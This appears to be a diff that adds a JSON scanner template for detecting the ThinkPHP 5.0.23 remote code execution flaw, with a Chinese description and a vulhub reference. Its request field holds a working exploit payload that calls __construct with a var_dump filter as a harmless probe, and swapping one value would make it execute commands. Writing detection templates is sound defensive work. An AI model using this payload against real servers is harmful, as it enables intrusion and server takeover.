@@ -1,0 +1,23 @@
+{
+    "target":"thinkphp",
+    "meta":{
+        "name":    "ThinkPHP5 5.0.23 远程代码执行漏洞",
+        "remarks": "其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞，可导致服务器直接被入侵控制。",
+        "level":   0,
+        "type":    "RCE",
+        "author":   "phith0n",
+        "references": {
+            "url":"https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md",
+            "cve":"",
+            "kpid":"KP-0079"
+        }
+    },
+    "request":{
+        "path":     "/index.php?s=captcha",
+        "postData": "_method=__construct&filter[]=var_dump&method=get&server[REQUEST_METHOD]=pGiopzVOki1L"
+    },
+    "verify":{
+        "type":  "string",
+        "match": "string(12) \"pGiopzVOki1L\""
+    }
+}
